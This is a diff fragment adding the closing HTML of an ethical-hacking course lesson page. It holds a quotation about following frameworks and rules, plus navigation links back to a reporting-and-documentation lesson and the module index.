+        <p style="margin: 0; font-style: italic; color: #cfd8dc;">
+          "Frameworks are not cages. They are the scaffolding that keeps your creativity legal, reproducible, and defensible. 
+		  The adversary ignores rules. You do not. That discipline is your competitive advantage."
+        </p>
+      </div>
+    </section>
+
+<!-- ============================================================ -->
+<!-- FLOATING NAVIGATION                                           -->
+<!-- ============================================================ -->
+
+    <div class="lesson-nav-container">
+      <a href="https://iscsecurity.org/content/1-ethical-hacking/1-introduction-to-ethical-hacking/08-reporting-and-documentation" class="nav-link-btn">👈 Back</a>
+      <a href="https://iscsecurity.org/content/1-ethical-hacking/index.html" class="nav-link-btn">Module Index</a>
+    </div>
+
+  </article>
+</main>
+</body>
+</html>
